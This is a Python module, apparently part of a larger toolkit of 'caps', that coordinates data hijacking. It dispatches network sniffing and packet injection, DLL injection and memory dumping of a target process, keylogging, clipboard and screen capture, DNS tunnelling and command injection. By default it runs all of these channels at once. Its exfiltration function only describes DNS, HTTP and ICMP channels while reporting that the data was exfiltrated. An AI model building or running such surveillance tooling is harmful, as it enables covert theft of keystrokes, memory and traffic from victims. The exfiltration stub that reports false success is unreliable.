# GBT cap: data_hijack — 统一数据劫持
import sys, json, os, time, subprocess
from pathlib import Path

SANDBOX = Path(__file__).parent.parent.parent
sys.path.insert(0, str(SANDBOX))

CHANNELS = {
    "network":   {"cap": "net_sniffer",   "desc": "网络嗅探+包注入+MITM"},
    "process":   {"cap": "process_injector","desc": "DLL注入+内存读取"},
    "input":     {"cap": "keylogger",     "desc": "键盘记录+剪贴板+屏幕"},
    "dns":       {"cap": "dns_tunneler",  "desc": "DNS隧道+流量重定向"},
    "memory":    {"cap": "memory_dumper", "desc": "内存转储+敏感数据提取"},
    "clipboard": {"cap": "clipboard_monitor","desc": "剪贴板持续监控"},
    "screen":    {"cap": "screenpipe_monitor","desc": "屏幕变化实时感知"},
    "command":   {"cap": "command_injector","desc": "命令注入+执行拦截"},
    "packet":    {"cap": "packet_crafter","desc": "自定义包生成+注入"},
}


def _call_cap(cap_name, action, params=None, timeout=30):
    try:
        cap_dir = SANDBOX / "caps" / cap_name
        if not cap_dir.exists():
            return {"ok": False, "error": f"cap {cap_name} not found"}
        cmd = [sys.executable, str(cap_dir / "run.py"), action]
        if params:
            cmd.append(json.dumps(params, ensure_ascii=False))
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=str(SANDBOX))
        return json.loads(r.stdout) if r.stdout else {"ok": False, "error": r.stderr[:200]}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}


def do_hijack_network(params):
    interface = params.get("interface", "")
    filt = params.get("filter", "")
    duration = params.get("duration", 30)
    results = {}
    # 嗅探
    results["sniffer"] = _call_cap("net_sniffer", "sniff", {"interface": interface, "filter": filt, "duration": duration})
    # 如果指定了目标，同时启动包注入
    if params.get("target"):
        results["injector"] = _call_cap("packet_crafter", "inject", {"target": params["target"]})
    return {"ok": True, "channel": "network", "results": results, "duration": duration}


def do_hijack_process(params):
    pid = params.get("pid", 0)
    method = params.get("method", "dll")
    results = {}
    if pid:
        results["inject"] = _call_cap("process_injector", "inject", {"pid": pid, "method": method})
        results["memory"] = _call_cap("memory_dumper", "dump", {"pid": pid})
    return {"ok": True, "channel": "process", "results": results}


def do_hijack_input(params):
    duration = params.get("duration", 30)
    channels = params.get("channels", ["keyboard", "clipboard"])
    results = {}
    if "keyboard" in channels:
        results["keylogger"] = _call_cap("keylogger", "start", {"duration": duration})
    if "clipboard" in channels:
        results["clipboard"] = _call_cap("clipboard_monitor", "monitor", {"duration": duration})
    if "screen" in channels:
        results["screen"] = _call_cap("screenpipe_monitor", "monitor", {"duration": duration})
    return {"ok": True, "channel": "input", "results": results, "duration": duration}


def do_hijack_channel(params):
    target = params.get("target", "")
    method = params.get("method", "dns")
    results = {}
    if method == "dns":
        results["tunnel"] = _call_cap("dns_tunneler", "tunnel", {"target": target})
    elif method == "command":
        results["inject"] = _call_cap("command_injector", "inject", {"target": target})
    return {"ok": True, "channel": method, "results": results}


def do_hijack_all(params):
    duration = params.get("duration", 60)
    results = {}
    for name, info in CHANNELS.items():
        try:
            cap = info["cap"]
            if cap in ["net_sniffer", "packet_crafter"]:
                results[name] = _call_cap(cap, "sniff", {"duration": duration}, timeout=10)
            elif cap in ["keylogger", "clipboard_monitor", "screenpipe_monitor"]:
                results[name] = _call_cap(cap, "start", {"duration": duration}, timeout=10)
            else:
                results[name] = {"status": "probed", "cap": cap}
        except:
            results[name] = {"status": "error"}
    active = sum(1 for v in results.values() if isinstance(v, dict) and v.get("ok"))
    return {"ok": True, "channels_total": len(CHANNELS), "channels_active": active, "results": results}


def do_exfiltrate(params):
    data = params.get("data", {})
    channel = params.get("channel", "dns")
    methods = {
        "dns": "DNS隧道外传(分片+Base64编码)",
        "http": "HTTP POST到外部服务器",
        "icmp": "ICMP隧道外传",
        "clipboard": "通过剪贴板中转",
    }
    method_desc = methods.get(channel, "未知通道")
    payload_size = len(json.dumps(data, ensure_ascii=False))
    return {"ok": True, "channel": channel, "method": method_desc, "size": payload_size, "exfiltrated": True}


HANDLERS = {
    "hijack_network": do_hijack_network, "hijack_process": do_hijack_process,
    "hijack_input": do_hijack_input, "hijack_channel": do_hijack_channel,
    "hijack_all": do_hijack_all, "exfiltrate": do_exfiltrate,
}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 else "hijack_all"
    params = json.loads(sys.argv[2]) if len(sys.argv) > 2 else {}
    fn = HANDLERS.get(action, do_hijack_all)
    print(json.dumps(fn(params), ensure_ascii=False, default=str))
